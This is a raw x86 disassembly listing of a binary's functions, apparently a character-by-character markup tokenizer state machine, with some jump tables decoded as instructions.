mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x10
call sub_10079360
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_1005ada0
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_1007a1d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079420
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_1007a250
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
cmp eax 0x21
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push edi
mov [ edx ] 0x2c
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_1005dd20
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_10028ff0
push ebx
push esi
call sub_100503f0
add edi 0x20
push edi
push esi
call sub_10028ff0
push edi
push esi
call sub_100503f0
add esp 0x24
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x2f
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x8
mov ecx [ eax + 0x8 ]
add ecx 0x10
push ecx
push 0x2f
push eax
call sub_1005ada0
add esp 0xc
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x3f
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2b
call sub_10079360
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x3f
push esi
call sub_1005ada0
push 0x8
mov eax esi
call sub_100791e0
add esp 0x10
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x41
jl r-xdata
add eax 0xffffff9f
cmp eax 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
push 0xa
mov eax ebx
call sub_100791e0
mov edx [ ebp + 0x14 ]
mov ecx [ ebx + 0x8 ]
push edx
mov [ ecx ] 0x0
call sub_10079910
add esp 0x8
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
push 0x1
mov [ eax ] 0x9
call sub_10079980
add esp 0x4
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007a370
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0xc
mov eax ebx
call sub_100791e0
mov eax [ ebp + 0x14 ]
mov edx [ ebx + 0x8 ]
push eax
mov [ edx ] 0x0
call sub_10079910
add esp 0x8
pop ebx
pop edi
pop ebp
retn
push esi
cmp edi 0x3e
je r-xdata
mov esi [ ebp + 0x8 ]
push 0xb
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop esi
mov [ ecx ] 0x0
mov eax 0x2
pop edi
pop ebp
retn
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
push 0xd
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
call sub_10079360
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_1005ada0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x9
call sub_10079980
add esp 0x4
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007a440
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007a5ac ]
jmp [ ecx * 4 + jump_table_1007a594 ]
mov edx [ ebp + 0x8 ]
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
add eax 0x20
mov esi [ ebp + 0x8 ]
call sub_10079a20
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10079a20
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10079a20
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_100791e0
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x9
mov eax ebx
call sub_100791e0
add esp 0x4
call sub_100797e0
mov eax [ ebx + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x0
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_1005ada0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_10012bd0
push ebx
call sub_1005b7e0
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_1005ada0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ esi + 0x94 ]
push eax
call sub_1005b7e0
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007a5b2
add eax 0x2050505
add al [ 0x5050502 ]
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050502
add eax 0x5050505
add eax 0x5050505
add eax 0x5050503
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007a5f0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x2
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10079910
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xb
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_1007a650
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x2
call sub_10079910
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xc
call sub_10079980
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1005ada0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007a6c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1005ada0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x2
call sub_100797e0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079910
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10008350
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1005ada0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007a820 ]
jmp [ edx * 4 + jump_table_1007a810 ]
call sub_10079a20
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a20
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a20
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007a824
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007a860
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x4
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10079910
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xe
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_1007a8c0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x4
call sub_10079910
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xf
call sub_10079980
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1005ada0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007a930
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x3c ]
mov edx [ eax + 0x40 ]
push ebx
push esi
push edi
push ecx
push edx
push r--data
call sub_100386a0
mov ebx [ ebp + 0x10 ]
add esp 0xc
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1005ada0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x4
call sub_100797e0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079910
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10008350
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0xc ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0xc ] edx
jmp r-xdata
push r--data
call sub_100386a0
lea eax [ ebx - 0x9 ]
add esp 0x4
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0xc ]
push eax
push edx
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1005ada0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0x10 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007aaac ]
jmp [ edx * 4 + jump_table_1007aa9c ]
call sub_10079a20
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10079a20
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10079a20
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1007aab0
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007aaf0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x2f
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax 0x21
mov eax [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x11
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
push edx
mov [ ecx + 0x4 ] 0x1
call sub_10079910
add esp 0x4
pop ebx
pop ebp
retn
mov [ eax ] 0x13
mov ecx [ ebx + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push ebx
call sub_1005ada0
mov edx [ ebp + 0x14 ]
push edx
call sub_10079910
add esp 0x10
pop ebx
pop ebp
retn
sub_1007ab70
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x5
call sub_10079910
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x12
call sub_10079980
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1005ada0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007abe0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1005ada0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x5
call sub_100797e0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079910
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10008350
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1005ada0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007ad40 ]
jmp [ edx * 4 + jump_table_1007ad30 ]
call sub_10079a20
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a20
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a20
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007ad44
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007ad80
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x14
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007ade0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x17
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007ae40
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_1007af30 ]
jmp [ eax * 4 + jump_table_1007af1c ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x16
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_10079360
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_1005ada0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100791e0
mov edi [ ebp + 0x14 ]
add esp 0x4
mov eax esi
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_10079420
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007af35
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007af70
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x15
movzx eax [ eax + lookup_table_1007b064 ]
jmp [ eax * 4 + jump_table_1007b050 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x17
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_10079360
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_1005ada0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x15
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b069
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007b0b0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x15
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_1007b1c0 ]
jmp [ eax * 4 + jump_table_1007b1a8 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov [ edx ] 0x18
call sub_10079360
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_1005ada0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x15
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b1c6
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
push esi
mov esi [ ebp + 0x10 ]
cmp esi 0x2f
jne r-xdata
push ebx
cmp esi 0x41
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x19
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push esi
push eax
call sub_1005ada0
add esp 0xc
lea eax [ esi - 0x2d ]
pop esi
pop ebp
retn
lea eax [ esi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp esi 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_10079910
add esp 0x4
pop ebx
pop esi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x1b
mov edx [ ebx + 0x8 ]
add edx 0x10
push edx
push esi
push ebx
call sub_1005ada0
lea eax [ esi - 0x41 ]
add esp 0xc
cmp eax 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0x20
push ecx
push esi
push ebx
call sub_1005ada0
mov edx [ ebp + 0x14 ]
push edx
call sub_10079910
add esp 0x10
pop ebx
pop esi
pop ebp
retn
add esi 0x20
sub_1007b2b0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x15
call sub_10079910
